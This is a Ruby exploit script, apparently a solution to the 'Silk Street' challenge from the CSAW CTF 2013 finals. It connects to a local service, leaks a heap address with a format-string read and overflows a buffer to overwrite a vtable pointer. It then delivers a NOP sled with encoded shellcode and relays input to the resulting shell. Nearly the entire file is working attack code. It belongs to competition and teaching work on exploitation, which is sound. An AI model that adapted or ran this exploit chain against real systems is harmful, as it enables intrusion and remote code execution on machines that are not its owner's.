#!/usr/bin/ruby
require "socket"
puts "[!] Silk Street Exploit"
puts "[!] Jeffrey Crowell"
puts "[!] CSAW CTF 2013 FINALS"


#sort of gives an interactive shell.

shellcode = "\x89\xe2\xd9\xe8\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49\x49" +
    "\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" +
    "\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" +
    "\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" +
    "\x42\x75\x4a\x49\x43\x5a\x34\x4b\x62\x78\x6e\x79\x53\x62" +
    "\x52\x46\x32\x48\x56\x4d\x55\x33\x4d\x59\x4a\x47\x45\x38" +
    "\x76\x4f\x43\x43\x52\x48\x73\x30\x50\x68\x76\x4f\x73\x52" +
    "\x62\x49\x52\x4e\x4b\x39\x58\x63\x36\x32\x38\x68\x35\x58" +
    "\x47\x70\x57\x70\x75\x50\x54\x6f\x51\x72\x70\x69\x42\x4e" +
    "\x36\x4f\x31\x63\x72\x48\x45\x50\x43\x67\x50\x53\x4d\x59" +
    "\x49\x71\x68\x4d\x4f\x70\x41\x41"

puts shellcode


s = TCPSocket.new('localhost', 4444)
#print out the header
(0..19).each{|ii|
    puts "SERVER: #{s.gets}"
}

#leak out the memory address of the heap
s.puts("%22$p")
s.gets
str = s.gets.strip
leaked_addr = str.hex
puts "[+] d0pe, got heap address 0x#{str.hex.to_s(16)}"
s.gets
target_buf = leaked_addr + 4088
puts "[+] baller, calculated the executable heap page is at 0x#{target_buf.to_s(16)}"

#buy an assassination

puts "[!] buying assassination"
s.puts("b")
s.gets
s.gets
s.gets
s.gets
s.gets
s.gets
s.gets
s.puts("4")
s.gets
s.gets

#check out

puts "[!] checking out"
s.puts("c")
s.gets
s.gets

#now overflow some crap
puts "[!] overflowing vtable pointer with calculated heap address"
buf = "y\x00" #gets keeps on getting even though there's a null byte ;)
buf << "A" * 62 #fill out the buffer
buf << [target_buf].pack('V') #overwrite the vtable with an address we have control over
puts "[+] constructed overflow buffer"


s.puts(buf) #agree to nothing illegal
s.gets

jmpaddr = target_buf + 512 # somewhere in the nopsled
buf = [jmpaddr].pack('V') #pack in the address
buf << "\x90" * 1024 #so we just nopslide over
buf << shellcode 
buf << "\n\n\n"
puts "[+] exploits is constructed"

s.puts(buf)

puts "[+] DROPPING SHELLCODEZZZ"
s.gets
puts "[!!!!!] GETTING PAYLOAD OUTPUT!"
(0..9999999).each{|i|
    str = gets.chomp
    s.puts str
    puts s.gets
}


